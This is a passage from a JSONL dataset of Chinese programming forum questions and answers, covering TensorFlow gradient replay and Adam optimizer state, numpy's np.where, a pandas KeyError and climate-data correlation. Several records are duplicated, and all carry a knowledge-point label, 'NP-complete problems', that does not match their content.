"cmVkSURSb290Q0EuY3J0MEUGA1UdHwQ+MDwwOqA4oDaG", "\n", "''", " SIG ", "''", " ", "NGh0dHA6Ly9jcmwzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2Vy", "\n", "''", " SIG ", "''", " ", "dEFzc3VyZWRJRFJvb3RDQS5jcmwwEQYDVR0gBAowCDAG", "\n", "''", " SIG ", "''", " ", "BgRVHSAAMA0GCSqGSIb3DQEBDAUAA4IBAQBwoL9DXFXn", "\n", "''", " SIG ", "''", " ", "OF+go3QbPbYW1", "/e/", "Vwe9mqyhhyzshV6pGrsi+IcaaVQi", "\n", "''", " SIG ", "''", " ", "7aSId229GhT0E0p6Ly23OO", "/", "0", "/", "4C5+KH38nLeJLxSA8hO", "\n", "''", " SIG ", "''", " ", "0Cre+i1Wz", "/n096wwepqLsl7Uz9FDRJtDIeuWcqFItJnL\n", "''", " SIG ", "''", " nU+nBgMTdydE1Od/", "6Fmo8L8vC6bp8jQ87PcDx4eo0kxA", "\n", "''", " SIG ", "''", " ", "GTVGamlUsLihVo7spNU96LHc", "/RzY9HdaXFSMb++hUD38\n", "''", " SIG ", "''", " dglohJ9vytsgjTVgHAIDyyCwrFigDkBjxZgiwbJZ9VVr\n", "''", " SIG ", "''", " zyerbHbObyMt9H5xaiNrIv8SuFQtJ37YOtnwtoeW/", "VvR", "\n", "''", " SIG ", "''", " ", "XKwYw02fc7cBqZ9Xql4o4rmUMYIDdjCCA3ICAQEwdzBj", "\n", "''", " SIG ", "''", " ", "MQswCQYDVQQGEwJVUzEXMBUGA1UEChMORGlnaUNlcnQs", "\n", "''", " SIG ", "''", " ", "IEluYy4xOzA5BgNVBAMTMkRpZ2lDZXJ0IFRydXN0ZWQg", "\n", "''", " SIG ", "''", " ", "RzQgUlNBNDA5NiBTSEEyNTYgVGltZVN0YW1waW5nIENB", "\n", "''", " SIG ", "''", " ", "AhAMTWlyS5T6PCpKPSkHgD1aMA0GCWCGSAFlAwQCAQUA", "\n", "''", " SIG ", "''", " ", "oIHRMBoGCSqGSIb3DQEJAzENBgsqhkiG9w0BCRABBDAc", "\n", "''", " SIG ", "''", " ", "BgkqhkiG9w0BCQUxDxcNMjIxMTA4MjMzNTE1WjArBgsq", "\n", "''", " SIG ", "''", " ", "hkiG9w0BCRACDDEcMBowGDAWBBTzhyJNhjOCkjWplLy9", "\n", "''", " SIG ", "''", " ", "j5bp", "/hx8czAvBgkqhkiG9w0BCQQxIgQgj4P2QjO2zqJ2\n", "''", " SIG ", "''", " Eiqqc6Xe0rmTwOL9WOhQO/", "A6JYbW780wNwYLKoZIhvcN", "\n", "''", " SIG ", "''", " ", "AQkQAi8xKDAmMCQwIgQgx", "/ThvjIoiSCr4iY6vhrE/", "E", "/m\n", "''", " SIG ", "''", " eBwtZNBMgHVXoCO1tvowDQYJKoZIhvcNAQEBBQAEggIA\n", "''", " SIG ", "''", " N4a6/", "PqXZ20xn5mtXpXGWnRHDSZmznxZ5uzEhJYQjFMQ", "\n", "''", " SIG ", "''", " ", "H6", "/tV8EIlSuOD4ubAQ2srfTxER8/", "KUYtUjo5CmhBFQ9y", "\n", "''", " SIG ", "''", " ", "N6eTJMdM2aZEFMBZZBUdB", "/", "6", "Uahs697pg6ZN9yXJLP8/", "G", "\n", "''", " SIG ", "''", " ", "8LzIMFv5MrYGguVHMnLftBPGEqOll8IUwQHEu", "/jziluB\n", "''", " SIG ", "''", " SAMWDQCdhq+VGkbeo8JUN1nbGr9/", "KXIp8rZ3ORobWFe2", "\n", "''", " SIG ", "''", " ", "d", "/CKlq2TgAAZ9QAPROg8Mpht8+G8tEpkP9vP0aB+wDoy\n", "''", " SIG ", "''", " dlruYRaobgZd4T7hsoeVeWN2lL9PLCV1FpCNKX0Pg05y\n", "''", " SIG ", "''", " MvXrldob51CzHTPPHde0buH3KJBJoRafMv5VMHGvaNNS\n", "''", " SIG ", "''", " nOq1WXI44Zqw7/", "y7Ji++nCaIU9ITLjr5qLfPLgXqDWAa", "\n", "''", " SIG ", "''", " ", "hbwfLRagQ3rk9Px+r6V22ApHzHtGmGKnHhgZAI+MJ7HN", "\n", "''", " SIG ", "''", " ", "Zc8Oh65qU1uQ2vsUq5fy3pbEuIRfZmn6AG9zMqsjqw3G", "\n", "''", " SIG ", "''", " ", "30pMnbSImYkKyTIb+jWC8vyLJqbirUaxpk+Iu4Mm9+ot", "\n", "''", " SIG ", "''", " ", "VV+6Ci3UgBssODRdSE9S3aKzGUbRFuWiriYVZxM", "/RJKM\n", "''", " SIG ", "''", " qaP4cnqoAXvTuMv1zU1Iz3han3MQyD3CjAVd0BM5D0m/\n", "''", " SIG ", "''", " ", "OsomA1SK4FAVM6qaPsD444jVIVzPRNP0b5Kc0P8ER6Q", "/\n", "''", " SIG ", "''", " HZvKs+BJqvWmPixPXGt6+KA=\n", "''", " SIG ", "''", " End signature block\n\n\n"]], "Tag": "算法设计"}
{"Answer": "&lt;p&gt;在上面给的代码的第164行处插入&lt;/p&gt;\n\n&lt;pre&gt;\n&lt;code class=\"language-python\"&gt;optimizer &amp;#61; optimizers.Adam(lr&amp;#61;1e-4)&lt;/code&gt;&lt;/pre&gt;\n\n&lt;p&gt;重新初始化optimizer&amp;#xff0c;这样两个模型训练后的测试结果就一样了&amp;#xff0c;望采纳&lt;/p&gt;", "Konwledge_Point": "NP完全问题", "Question": ["tensorflow2.x 深度学习 使用相同梯度进行梯度下降的两个相同神经网络，得到的结果却不同", ["用深度神经网络进行训练时，将每个step计算出的梯度grad保存进一个list（见下方代码段第20行）", "\n\n", "\n", "for step, (x, y) in enumerate(train_db):\n    with tf.GradientTape() as tape:  # 构建梯度记录环境\n        # 插入通道维度，=>[b,32,32,1]\n        intermediate_out = conv_net(x, training=True)\n        intermediate_out = tf.reshape(intermediate_out, [-1, 512])\n        out = fc_net(intermediate_out, training=True)\n\n        # 真实标签 one-hot 编码，[b] => [b, 10]\n        y_one_hot = tf.one_hot(y, depth=10)\n        # 计算交叉熵损失函数，标量\n        loss = tf.losses.categorical_crossentropy(y_one_hot, out, from_logits=True)\n        loss = tf.reduce_mean(loss)\n\n    # 列表合并，合并 2 个子网络的参数\n    variables = conv_net.trainable_variables + fc_net.trainable_variables\n    # 对所有参数求梯度\n    grads = tape.gradient(loss, variables)\n    \n    # 将grads保存进一个list中\n    grad_list.append(grads)\n\n    optimizer.apply_gradients(zip(grads, variables))", "\n\n", "然后创建另一个一模一样的神经网络，并使用刚刚保存的grads-list中的每个grads依次对该神经网络进行梯度下降", "\n\n", "\n", "# 加载刚刚保存的相同的VGG-13网络，利用刚刚生成的grad进行梯度下降\nt_conv_net = models.load_model('conv_net0.h5', compile=False)\nt_fc_net = models.load_model('fc_net0.h5', compile=False)\n# 训练前测试一下模型准确率\nt_accuracy_before = run_test(t_conv_net, t_fc_net, test_db)\nprint(\"t_accuracy before train = \", t_accuracy_before)\n\nt_variables = t_conv_net.trainable_variables + t_fc_net.trainable_variables\n\nfor gg in grad_list:\n    optimizer.apply_gradients(zip(gg, t_variables))", "\n\n", "理论上经过这一轮训练，应该得到两个完全相同的训练后的模型，因为两个模型初始化相同，使用了相同的梯度grads进行梯度下降来训练它们的参数。然而结果却并非如此，第一个模型经过这一轮训练，测试准确率从0.11左右提升至了0.4左右；而第二个模型的测试准确率却几乎没有变化。", "\n\n", "\n\n", "请各位大佬指导一下，为什么使用相同的梯度进行梯度下降，却会得到不同的结果?万分感激！", "\n\n", "完整代码如下所示：", "\n\n", "\n", "import os\nimport numpy as np\nimport math\nimport tensorflow as tf  # 导入 TF 库\nfrom tensorflow.keras import layers, Sequential, losses, optimizers, datasets, models\nimport matplotlib.pyplot as plt\n\n# 设置 GPU 显存使用方式为：为增长式占用-----------------------\ngpus = tf.config.experimental.list_physical_devices('GPU')\nif gpus:\n    try:  # 设置 GPU 为增长式占用\n        for gpu in gpus:\n            tf.config.experimental.set_memory_growth(gpu, True)\n    except RuntimeError as e:\n        # 打印异常\n        print(e)\n\nos.environ['TF_CPP_MIN_LOG_LEVEL'] = '2'\ntf.random.set_seed(2345)\n\n\ndef vgg13():\n    conv_layers = [\n        # 先创建包含多网络层的列表\n        # Conv-Conv-Pooling 单元 1\n        # 64 个 3x3 卷积核, 输入输出同大小\n        layers.Conv2D(64, kernel_size=[3, 3], padding=\"same\", activation=tf.nn.relu),\n        layers.Conv2D(64, kernel_size=[3, 3], padding=\"same\", activation=tf.nn.relu),\n        # 高宽减半\n        layers.MaxPool2D(pool_size=[2, 2], strides=2, padding='same'),\n\n        # Conv-Conv-Pooling 单元 2,输出通道提升至 128，高宽大小减半\n        layers.Conv2D(128, kernel_size=[3, 3], padding=\"same\", activation=tf.nn.relu),\n        layers.Conv2D(128, kernel_size=[3, 3], padding=\"same\", activation=tf.nn.relu),\n        layers.MaxPool2D(pool_size=[2, 2], strides=2, padding='same'),\n\n        # Conv-Conv-Pooling 单元 3,输出通道提升至 256，高宽大小减半\n        layers.Conv2D(256, kernel_size=[3, 3], padding=\"same\", activation=tf.nn.relu),\n        layers.Conv2D(256, kernel_size=[3, 3], padding=\"same\", activation=tf.nn.relu),\n        layers.MaxPool2D(pool_size=[2, 2], strides=2, padding='same'),\n\n        # Conv-Conv-Pooling 单元 4,输出通道提升至 512，高宽大小减半\n        layers.Conv2D(512, kernel_size=[3, 3], padding=\"same\", activation=tf.nn.relu),\n        layers.Conv2D(512, kernel_size=[3, 3], padding=\"same\", activation=tf.nn.relu),\n        layers.MaxPool2D(pool_size=[2, 2], strides=2, padding='same'),\n\n        # Conv-Conv-Pooling 单元 5,输出通道提升至 512，高宽大小减半\n        layers.Conv2D(512, kernel_size=[3, 3], padding=\"same\", activation=tf.nn.relu),\n        layers.Conv2D(512, kernel_size=[3, 3], padding=\"same\", activation=tf.nn.relu),\n        layers.MaxPool2D(pool_size=[2, 2], strides=2, padding='same')\n    ]\n\n    # 利用前面创建的层列表构建网络容器\n    conv_net = Sequential(conv_layers)\n\n    # 创建 3 层全连接层子网络\n    fc_net = Sequential([\n        layers.Dense(256, activation=tf.nn.relu),\n        layers.Dense(128, activation=tf.nn.relu),\n        layers.Dense(10, activation=None),\n    ])\n\n    # build2 个子网络，并打印网络参数信息\n    conv_net.build(input_shape=[None, 32, 32, 3])\n    fc_net.build(input_shape=[None, 512])\n\n    return conv_net, fc_net\n\n\ndef preprocess(x, y):\n    x = tf.cast(x, dtype=tf.float32) / 255.\n    y = tf.cast(y, dtype=tf.int32)  # 类型转换\n    return x, y\n\n\ndef generating_data_set(input_x, input_y, batch):\n    # 构建训练集对象，随机打乱，预处理，批量化\n    db = tf.data.Dataset.from_tensor_slices((input_x, input_y))\n    db = db.shuffle(1000).map(preprocess).batch(batch)  # 构建测试集对象，预处理，批量化\n    return db\n\n\ndef run_test(conv_net, fc_net, test_db):\n    # 记录预测正确的数量，总样本数量\n    correct_num, total_num = 0, 0\n    for x, y in test_db:  # 遍历所有训练集样本\n        # 插入通道维度，=>[b,28,28,1]\n        intermediate_out = conv_net(x, training=False)\n        intermediate_out = tf.reshape(intermediate_out, [-1, 512])\n        out = fc_net(intermediate_out, training=False)\n        # 先经过 softmax，再 argmax\n        prob = tf.nn.softmax(out, axis=1)\n        pred = tf.argmax(prob, axis=1)\n        pred = tf.cast(pred, dtype=tf.int32)\n\n        correct = tf.cast(tf.equal(pred, y), dtype=tf.int32)\n        correct = tf.reduce_sum(correct)\n        total_num += x.shape[0]\n        correct_num += int(correct)\n\n    # 计算准确率\n    accuracy = correct_num / total_num\n    return accuracy\n\n(x, y), (x_test, y_test) = datasets.cifar10.load_data()  # 数据集为cifar10\n# 删除 y 的一个维度，[b,1] => [b]\ny = tf.squeeze(y, axis=1)\ny_test = tf.squeeze(y_test, axis=1)\n\ntrain_db = generating_data_set(x, y, 128)\ntest_db = generating_data_set(x_test, y_test, 64)\n\ngrad_list = []  # 用于存储每个step产生的梯度grad\nconv_net, fc_net = vgg13()  # 使用的神经网络为VGG-13\noptimizer = optimizers.Adam(lr=1e-4)\n\n# 将神经网络保存\nconv_net.save('conv_net0.h5')\nfc_net.save('fc_net0.h5')\nprint(\"第一个模型：\")\n# 训练前测试一下模型准确率\naccuracy_before = run_test(conv_net, fc_net, test_db)\nprint(\"accuracy before train = \", accuracy_before)\n\nfor step, (x, y) in enumerate(train_db):\n    with tf.GradientTape() as tape:  # 构建梯度记录环境\n        # 插入通道维度，=>[b,32,32,1]\n        intermediate_out = conv_net(x, training=True)\n        intermediate_out = tf.reshape(intermediate_out, [-1, 512])\n        out = fc_net(intermediate_out, training=True)\n\n        # 真实标签 one-hot 编码，[b] => [b, 10]\n        y_one_hot = tf.one_hot(y, depth=10)\n        # 计算交叉熵损失函数，标量\n        loss = tf.losses.categorical_crossentropy(y_one_hot, out, from_logits=True)\n        loss = tf.reduce_mean(loss)\n\n    # 列表合并，合并 2 个子网络的参数\n    variables = conv_net.trainable_variables + fc_net.trainable_variables\n    # 对所有参数求梯度\n    grads = tape.gradient(loss, variables)\n\n    # 将grads保存进一个list中\n    grad_list.append(grads)\n\n    optimizer.apply_gradients(zip(grads, variables))\n\n# 训练后测试一下模型准确率\naccuracy_after = run_test(conv_net, fc_net, test_db)\nprint(\"accuracy after train = \", accuracy_after)\n\ndel conv_net\ndel fc_net\n\n# 加载刚刚保存的相同的VGG-13网络，利用刚刚生成的grad进行梯度下降\nt_conv_net = models.load_model('conv_net0.h5', compile=False)\nt_fc_net = models.load_model('fc_net0.h5', compile=False)\nprint(\"\\n第二个模型：\")\n# 训练前测试一下模型准确率\nt_accuracy_before = run_test(t_conv_net, t_fc_net, test_db)\nprint(\"t_accuracy before train = \", t_accuracy_before)\n\nt_variables = t_conv_net.trainable_variables + t_fc_net.trainable_variables\n\nfor gg in grad_list:\n    optimizer.apply_gradients(zip(gg, t_variables))\n\n# 训练后测试一下模型准确率\nt_accuracy_after = run_test(t_conv_net, t_fc_net, test_db)\nprint(\"t_accuracy after train = \", t_accuracy_after)\n"]], "Tag": "算法设计"}
{"Answer": "&lt;p&gt;在上面给的代码的第164行处插入&lt;/p&gt;\n\n&lt;pre&gt;\n&lt;code class=\"language-python\"&gt;optimizer &amp;#61; optimizers.Adam(lr&amp;#61;1e-4)&lt;/code&gt;&lt;/pre&gt;\n\n&lt;p&gt;重新初始化optimizer&amp;#xff0c;这样两个模型训练后的测试结果就一样了&amp;#xff0c;望采纳&lt;/p&gt;", "Konwledge_Point": "NP完全问题", "Question": ["tensorflow2.x 深度学习 使用相同梯度进行梯度下降的两个相同神经网络，得到的结果却不同", ["用深度神经网络进行训练时，将每个step计算出的梯度grad保存进一个list（见下方代码段第20行）", "\n\n", "\n", "for step, (x, y) in enumerate(train_db):\n    with tf.GradientTape() as tape:  # 构建梯度记录环境\n        # 插入通道维度，=>[b,32,32,1]\n        intermediate_out = conv_net(x, training=True)\n        intermediate_out = tf.reshape(intermediate_out, [-1, 512])\n        out = fc_net(intermediate_out, training=True)\n\n        # 真实标签 one-hot 编码，[b] => [b, 10]\n        y_one_hot = tf.one_hot(y, depth=10)\n        # 计算交叉熵损失函数，标量\n        loss = tf.losses.categorical_crossentropy(y_one_hot, out, from_logits=True)\n        loss = tf.reduce_mean(loss)\n\n    # 列表合并，合并 2 个子网络的参数\n    variables = conv_net.trainable_variables + fc_net.trainable_variables\n    # 对所有参数求梯度\n    grads = tape.gradient(loss, variables)\n    \n    # 将grads保存进一个list中\n    grad_list.append(grads)\n\n    optimizer.apply_gradients(zip(grads, variables))", "\n\n", "然后创建另一个一模一样的神经网络，并使用刚刚保存的grads-list中的每个grads依次对该神经网络进行梯度下降", "\n\n", "\n", "# 加载刚刚保存的相同的VGG-13网络，利用刚刚生成的grad进行梯度下降\nt_conv_net = models.load_model('conv_net0.h5', compile=False)\nt_fc_net = models.load_model('fc_net0.h5', compile=False)\n# 训练前测试一下模型准确率\nt_accuracy_before = run_test(t_conv_net, t_fc_net, test_db)\nprint(\"t_accuracy before train = \", t_accuracy_before)\n\nt_variables = t_conv_net.trainable_variables + t_fc_net.trainable_variables\n\nfor gg in grad_list:\n    optimizer.apply_gradients(zip(gg, t_variables))", "\n\n", "理论上经过这一轮训练，应该得到两个完全相同的训练后的模型，因为两个模型初始化相同，使用了相同的梯度grads进行梯度下降来训练它们的参数。然而结果却并非如此，第一个模型经过这一轮训练，测试准确率从0.11左右提升至了0.4左右；而第二个模型的测试准确率却几乎没有变化。", "\n\n", "\n\n", "请各位大佬指导一下，为什么使用相同的梯度进行梯度下降，却会得到不同的结果?万分感激！", "\n\n", "完整代码如下所示：", "\n\n", "\n", "import os\nimport numpy as np\nimport math\nimport tensorflow as tf  # 导入 TF 库\nfrom tensorflow.keras import layers, Sequential, losses, optimizers, datasets, models\nimport matplotlib.pyplot as plt\n\n# 设置 GPU 显存使用方式为：为增长式占用-----------------------\ngpus = tf.config.experimental.list_physical_devices('GPU')\nif gpus:\n    try:  # 设置 GPU 为增长式占用\n        for gpu in gpus:\n            tf.config.experimental.set_memory_growth(gpu, True)\n    except RuntimeError as e:\n        # 打印异常\n        print(e)\n\nos.environ['TF_CPP_MIN_LOG_LEVEL'] = '2'\ntf.random.set_seed(2345)\n\n\ndef vgg13():\n    conv_layers = [\n        # 先创建包含多网络层的列表\n        # Conv-Conv-Pooling 单元 1\n        # 64 个 3x3 卷积核, 输入输出同大小\n        layers.Conv2D(64, kernel_size=[3, 3], padding=\"same\", activation=tf.nn.relu),\n        layers.Conv2D(64, kernel_size=[3, 3], padding=\"same\", activation=tf.nn.relu),\n        # 高宽减半\n        layers.MaxPool2D(pool_size=[2, 2], strides=2, padding='same'),\n\n        # Conv-Conv-Pooling 单元 2,输出通道提升至 128，高宽大小减半\n        layers.Conv2D(128, kernel_size=[3, 3], padding=\"same\", activation=tf.nn.relu),\n        layers.Conv2D(128, kernel_size=[3, 3], padding=\"same\", activation=tf.nn.relu),\n        layers.MaxPool2D(pool_size=[2, 2], strides=2, padding='same'),\n\n        # Conv-Conv-Pooling 单元 3,输出通道提升至 256，高宽大小减半\n        layers.Conv2D(256, kernel_size=[3, 3], padding=\"same\", activation=tf.nn.relu),\n        layers.Conv2D(256, kernel_size=[3, 3], padding=\"same\", activation=tf.nn.relu),\n        layers.MaxPool2D(pool_size=[2, 2], strides=2, padding='same'),\n\n        # Conv-Conv-Pooling 单元 4,输出通道提升至 512，高宽大小减半\n        layers.Conv2D(512, kernel_size=[3, 3], padding=\"same\", activation=tf.nn.relu),\n        layers.Conv2D(512, kernel_size=[3, 3], padding=\"same\", activation=tf.nn.relu),\n        layers.MaxPool2D(pool_size=[2, 2], strides=2, padding='same'),\n\n        # Conv-Conv-Pooling 单元 5,输出通道提升至 512，高宽大小减半\n        layers.Conv2D(512, kernel_size=[3, 3], padding=\"same\", activation=tf.nn.relu),\n        layers.Conv2D(512, kernel_size=[3, 3], padding=\"same\", activation=tf.nn.relu),\n        layers.MaxPool2D(pool_size=[2, 2], strides=2, padding='same')\n    ]\n\n    # 利用前面创建的层列表构建网络容器\n    conv_net = Sequential(conv_layers)\n\n    # 创建 3 层全连接层子网络\n    fc_net = Sequential([\n        layers.Dense(256, activation=tf.nn.relu),\n        layers.Dense(128, activation=tf.nn.relu),\n        layers.Dense(10, activation=None),\n    ])\n\n    # build2 个子网络，并打印网络参数信息\n    conv_net.build(input_shape=[None, 32, 32, 3])\n    fc_net.build(input_shape=[None, 512])\n\n    return conv_net, fc_net\n\n\ndef preprocess(x, y):\n    x = tf.cast(x, dtype=tf.float32) / 255.\n    y = tf.cast(y, dtype=tf.int32)  # 类型转换\n    return x, y\n\n\ndef generating_data_set(input_x, input_y, batch):\n    # 构建训练集对象，随机打乱，预处理，批量化\n    db = tf.data.Dataset.from_tensor_slices((input_x, input_y))\n    db = db.shuffle(1000).map(preprocess).batch(batch)  # 构建测试集对象，预处理，批量化\n    return db\n\n\ndef run_test(conv_net, fc_net, test_db):\n    # 记录预测正确的数量，总样本数量\n    correct_num, total_num = 0, 0\n    for x, y in test_db:  # 遍历所有训练集样本\n        # 插入通道维度，=>[b,28,28,1]\n        intermediate_out = conv_net(x, training=False)\n        intermediate_out = tf.reshape(intermediate_out, [-1, 512])\n        out = fc_net(intermediate_out, training=False)\n        # 先经过 softmax，再 argmax\n        prob = tf.nn.softmax(out, axis=1)\n        pred = tf.argmax(prob, axis=1)\n        pred = tf.cast(pred, dtype=tf.int32)\n\n        correct = tf.cast(tf.equal(pred, y), dtype=tf.int32)\n        correct = tf.reduce_sum(correct)\n        total_num += x.shape[0]\n        correct_num += int(correct)\n\n    # 计算准确率\n    accuracy = correct_num / total_num\n    return accuracy\n\n(x, y), (x_test, y_test) = datasets.cifar10.load_data()  # 数据集为cifar10\n# 删除 y 的一个维度，[b,1] => [b]\ny = tf.squeeze(y, axis=1)\ny_test = tf.squeeze(y_test, axis=1)\n\ntrain_db = generating_data_set(x, y, 128)\ntest_db = generating_data_set(x_test, y_test, 64)\n\ngrad_list = []  # 用于存储每个step产生的梯度grad\nconv_net, fc_net = vgg13()  # 使用的神经网络为VGG-13\noptimizer = optimizers.Adam(lr=1e-4)\n\n# 将神经网络保存\nconv_net.save('conv_net0.h5')\nfc_net.save('fc_net0.h5')\nprint(\"第一个模型：\")\n# 训练前测试一下模型准确率\naccuracy_before = run_test(conv_net, fc_net, test_db)\nprint(\"accuracy before train = \", accuracy_before)\n\nfor step, (x, y) in enumerate(train_db):\n    with tf.GradientTape() as tape:  # 构建梯度记录环境\n        # 插入通道维度，=>[b,32,32,1]\n        intermediate_out = conv_net(x, training=True)\n        intermediate_out = tf.reshape(intermediate_out, [-1, 512])\n        out = fc_net(intermediate_out, training=True)\n\n        # 真实标签 one-hot 编码，[b] => [b, 10]\n        y_one_hot = tf.one_hot(y, depth=10)\n        # 计算交叉熵损失函数，标量\n        loss = tf.losses.categorical_crossentropy(y_one_hot, out, from_logits=True)\n        loss = tf.reduce_mean(loss)\n\n    # 列表合并，合并 2 个子网络的参数\n    variables = conv_net.trainable_variables + fc_net.trainable_variables\n    # 对所有参数求梯度\n    grads = tape.gradient(loss, variables)\n\n    # 将grads保存进一个list中\n    grad_list.append(grads)\n\n    optimizer.apply_gradients(zip(grads, variables))\n\n# 训练后测试一下模型准确率\naccuracy_after = run_test(conv_net, fc_net, test_db)\nprint(\"accuracy after train = \", accuracy_after)\n\ndel conv_net\ndel fc_net\n\n# 加载刚刚保存的相同的VGG-13网络，利用刚刚生成的grad进行梯度下降\nt_conv_net = models.load_model('conv_net0.h5', compile=False)\nt_fc_net = models.load_model('fc_net0.h5', compile=False)\nprint(\"\\n第二个模型：\")\n# 训练前测试一下模型准确率\nt_accuracy_before = run_test(t_conv_net, t_fc_net, test_db)\nprint(\"t_accuracy before train = \", t_accuracy_before)\n\nt_variables = t_conv_net.trainable_variables + t_fc_net.trainable_variables\n\nfor gg in grad_list:\n    optimizer.apply_gradients(zip(gg, t_variables))\n\n# 训练后测试一下模型准确率\nt_accuracy_after = run_test(t_conv_net, t_fc_net, test_db)\nprint(\"t_accuracy after train = \", t_accuracy_after)\n"]], "Tag": "算法设计"}
{"Answer": "https://www.cnblogs.com/massquantity/p/8908859.html\r\n\r\naa = np.arange(10)\r\nnp.where(aa,1,-1)\r\n相当于\r\naa = np.arange(10)\r\nnp.where(aa != 0,1,-1)", "Konwledge_Point": "NP完全问题", "Question": ["np.where这个函数不太理解", ["\n", "\n", "\n", "aa = np.arange(10)", "\nnp.where(aa,1,-1)", "\narray([-1,  1,  1,  1,  1,  1,  1,  1,  1,  1])  # 0为False，所以第一个输出-1", "\n", "\n", "\n", "\n\n", "疑问1，where函数的第一个参数为条件，把序列当成条件是什么意思？条件不是大于小于等这一类的吗？总之结果怎么来的", "\n\n", "\n", "\n", "\n", "np.where([[True,False], [True,True]],", "\n             [[1,2], [3,4]],", "\n             [[9,8], [7,6]])", "\narray([[1, 8],", "\n       [3, 4]])", "\n", "\n", "\n", "\n\n", "疑问2，[[True,False], [True,True]]为条件，满足条件输出 [[1,2], [3,4]],不满足输出 [[9,8], [7,6]]。（where函数的用法是这样的），结果是怎么来的", "\n\n", "\n", "\n", "\n", "np.where([[0, 1], [1, 0]])", "\n(array([0, 1]), array([1, 0]))", "\n上面这个例子条件中[[0,1],[1,0]]的真值为两个1，各自的第一维坐标为[0,1]，第二维坐标为[1,0] 。", "\n", "\n", "\n", "\n\n", "疑问3，这个结果和解释到底怎么来的", "\n\n", "\n", "\n", "\n", "a = np.arange(27).reshape(3,3,3)", "\na", "\narray([[[ 0,  1,  2],", "\n        [ 3,  4,  5],", "\n        [ 6,  7,  8]],", "\n", "\n", "\n", "\n\n", "   [[ 9, 10, 11],\n    [12, 13, 14],\n    [15, 16, 17]],\n\n   [[18, 19, 20],\n    [21, 22, 23],\n    [24, 25, 26]]])\n", "\n\n", "\n", "\n", "\n", "np.where(a > 5)", "\n(array([0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 2, 2, 2, 2, 2, 2, 2, 2, 2]),", "\n array([2, 2, 2, 0, 0, 0, 1, 1, 1, 2, 2, 2, 0, 0, 0, 1, 1, 1, 2, 2, 2]),", "\n array([0, 1, 2, 0, 1, 2, 0, 1, 2, 0, 1, 2, 0, 1, 2, 0, 1, 2, 0, 1, 2]))", "\n", "\n", "\n", "\n\n", "疑问4  这个结果得到的索引值也是完全看不懂"]], "Tag": "算法设计"}
{"Answer": "https://www.cnblogs.com/massquantity/p/8908859.html\r\n\r\naa = np.arange(10)\r\nnp.where(aa,1,-1)\r\n相当于\r\naa = np.arange(10)\r\nnp.where(aa != 0,1,-1)", "Konwledge_Point": "NP完全问题", "Question": ["np.where这个函数不太理解", ["\n", "\n", "\n", "aa = np.arange(10)", "\nnp.where(aa,1,-1)", "\narray([-1,  1,  1,  1,  1,  1,  1,  1,  1,  1])  # 0为False，所以第一个输出-1", "\n", "\n", "\n", "\n\n", "疑问1，where函数的第一个参数为条件，把序列当成条件是什么意思？条件不是大于小于等这一类的吗？总之结果怎么来的", "\n\n", "\n", "\n", "\n", "np.where([[True,False], [True,True]],", "\n             [[1,2], [3,4]],", "\n             [[9,8], [7,6]])", "\narray([[1, 8],", "\n       [3, 4]])", "\n", "\n", "\n", "\n\n", "疑问2，[[True,False], [True,True]]为条件，满足条件输出 [[1,2], [3,4]],不满足输出 [[9,8], [7,6]]。（where函数的用法是这样的），结果是怎么来的", "\n\n", "\n", "\n", "\n", "np.where([[0, 1], [1, 0]])", "\n(array([0, 1]), array([1, 0]))", "\n上面这个例子条件中[[0,1],[1,0]]的真值为两个1，各自的第一维坐标为[0,1]，第二维坐标为[1,0] 。", "\n", "\n", "\n", "\n\n", "疑问3，这个结果和解释到底怎么来的", "\n\n", "\n", "\n", "\n", "a = np.arange(27).reshape(3,3,3)", "\na", "\narray([[[ 0,  1,  2],", "\n        [ 3,  4,  5],", "\n        [ 6,  7,  8]],", "\n", "\n", "\n", "\n\n", "   [[ 9, 10, 11],\n    [12, 13, 14],\n    [15, 16, 17]],\n\n   [[18, 19, 20],\n    [21, 22, 23],\n    [24, 25, 26]]])\n", "\n\n", "\n", "\n", "\n", "np.where(a > 5)", "\n(array([0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 2, 2, 2, 2, 2, 2, 2, 2, 2]),", "\n array([2, 2, 2, 0, 0, 0, 1, 1, 1, 2, 2, 2, 0, 0, 0, 1, 1, 1, 2, 2, 2]),", "\n array([0, 1, 2, 0, 1, 2, 0, 1, 2, 0, 1, 2, 0, 1, 2, 0, 1, 2, 0, 1, 2]))", "\n", "\n", "\n", "\n\n", "疑问4  这个结果得到的索引值也是完全看不懂"]], "Tag": "算法设计"}
{"Answer": "&lt;p&gt;print一下train&amp;#xff0c;里面看看为啥里面没有”ViolentCrimesPerPop” 这个key&lt;/p&gt;", "Konwledge_Point": "NP完全问题", "Question": ["python中np.array的用法", ["violentcrimesperpop是表格中的一个参数，为什么是这个错误，完全看不懂啊。有没有大佬指导一下。源代码如下：", "\n\n", "\n\n", "\n\n", " ", "\n\n", " "]], "Tag": "算法设计"}
{"Answer": "&lt;p&gt;print一下train&amp;#xff0c;里面看看为啥里面没有”ViolentCrimesPerPop” 这个key&lt;/p&gt;", "Konwledge_Point": "NP完全问题", "Question": ["python中np.array的用法", ["violentcrimesperpop是表格中的一个参数，为什么是这个错误，完全看不懂啊。有没有大佬指导一下。源代码如下：", "\n\n", "\n\n", "\n\n", " ", "\n\n", " "]], "Tag": "算法设计"}
{"Answer": "&lt;p&gt;&lt;strong&gt;g_s_m.corr(g_a_d),类型转换一下&lt;/strong&gt;&lt;/p&gt;\n\n&lt;p&gt;g_s_m &amp;#61; pd.Series(era5_list&amp;#xff0c;dtype&amp;#61;np.float64)&lt;/p&gt;\n\n&lt;p&gt; &lt;/p&gt;", "Konwledge_Point": "NP完全问题", "Question": ["数据处理时出现'float' object has no attribute 'shape'怎么办？", ["我在用Python处理气象数据时出现的问题。按照工作需要，我在对ERA5（下载链接：链接：", "https://pan.baidu.com/s/1alH1cLXOAGYMz67dPdoZ2w ", " 提取码：", "c4b2", " ）和", "CRU_TS v4.04", "（下载链接：链接：", "https://pan.baidu.com/s/1c4IVFI-jetxuEThaCqml1g", " 提取码：", "w5r0 ", "）的气温数据进行分析，计算", "相关系数（CC）", "，后面计算的代码来源于网络，前面的代码作用的统一经纬度分辨率（把ERA5经纬度统一成与CRU_TS v4.04一样的0.5度乘0.5度），现在确认在统一经纬度分辨率没有问题。", "CRU_TS v4.04", "没有海洋和南极地区的数据，所以存在", "NaN空值", "，在如下的代码运算之后，", "\n\n", "\n", "import pandas as pd\nimport pylab as plt\nfrom netCDF4 import Dataset\nimport numpy as np\nfile_0 = 